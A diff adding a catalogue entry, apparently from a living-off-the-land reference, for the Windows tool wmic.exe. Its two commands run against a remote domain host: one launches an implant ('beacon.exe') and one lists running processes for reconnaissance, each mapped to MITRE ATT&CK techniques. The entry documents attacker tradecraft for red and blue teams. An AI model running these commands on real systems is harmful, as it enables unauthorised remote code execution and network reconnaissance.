@@ -1,0 +1,29 @@
+---
+Name: wmic.exe
+Description: Command-line interface for Windows Management Instrumentation (WMI)
+Updated: 2023-07-01
+Toolsets:
+  - Builtin
+Commands:
+  - Command: 'wmic.exe /node:W10.ad.bitsadmin.com process call create "beacon.exe"'
+    Description: Launch process
+    Usecases:
+      - Launch implant
+    Function: Execute
+    Comments:
+    MitreAttack:
+      - T1047
+  - Command: 'wmic.exe /node:W10.ad.bitsadmin.com /output:processes.csv process list /format:CSV'
+    Description: Query processes
+    Usecases:
+      - Reconnaissance on running processes
+    Function: Processes
+    Comments:
+    MitreAttack:
+      - T1057
+      - T1047
+Resources:
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
